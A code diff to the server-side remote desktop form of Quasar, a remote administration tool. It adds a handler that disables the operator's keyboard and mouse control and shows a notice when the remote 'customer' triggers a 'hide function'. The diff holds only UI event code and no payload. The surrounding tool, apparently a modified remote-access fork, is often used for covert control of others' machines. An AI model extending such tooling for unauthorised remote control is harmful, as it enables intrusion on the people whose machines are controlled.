@@ -409,6 +409,7 @@ namespace Quasar.Server.Forms
             _remoteDesktopHandler.ClientDriverStateChanged += KBMDriverStateChanged;
             _remoteDesktopHandler.DesktopNamesReceived += RemoteDesktopNamesReceived;
             _remoteDesktopHandler.ActiveDesktopNameReceived += RemoteActiveDesktopNameReceived;
+            _remoteDesktopHandler.HideEventReceived += RemoteHideFunctionEventReceived;
             MessageHandler.Register(_remoteDesktopHandler);
 
             //MessageHandler.Register(_clientDebugMessageHandler);
@@ -426,6 +427,7 @@ namespace Quasar.Server.Forms
             _remoteDesktopHandler.ClientDriverStateChanged -= KBMDriverStateChanged;
             _remoteDesktopHandler.DesktopNamesReceived -= RemoteDesktopNamesReceived;
             _remoteDesktopHandler.ActiveDesktopNameReceived -= RemoteActiveDesktopNameReceived;
+            _remoteDesktopHandler.HideEventReceived -= RemoteHideFunctionEventReceived;
             _connectClient.ClientState -= ClientDisconnected;
         }
 
@@ -578,6 +580,20 @@ namespace Quasar.Server.Forms
                 SubscribeEvents();
                 StartStream();
             }
+        }
+
+        private void RemoteHideFunctionEventReceived(object sender, string name)
+        {
+            _enableKeyboardInput = false;
+            this.picDesktop.Cursor = Cursors.Default;
+            btnKeyboard.Image = Properties.Resources.keyboard_delete;
+            toolTipButtons.SetToolTip(btnKeyboard, "Enable keyboard input.");
+
+            _enableMouseInput = false;
+            this.picDesktop.Cursor = Cursors.Default;
+            btnMouse.Image = Properties.Resources.mouse_delete;
+            toolTipButtons.SetToolTip(btnMouse, "Enable mouse input.");
+            MessageBox.Show("Hide Function is triggered by custoemr!\nThere is no RedText and AutoTyper.", "Notification", MessageBoxButtons.OK, MessageBoxIcon.Information);
         }
 
         /// <summary>
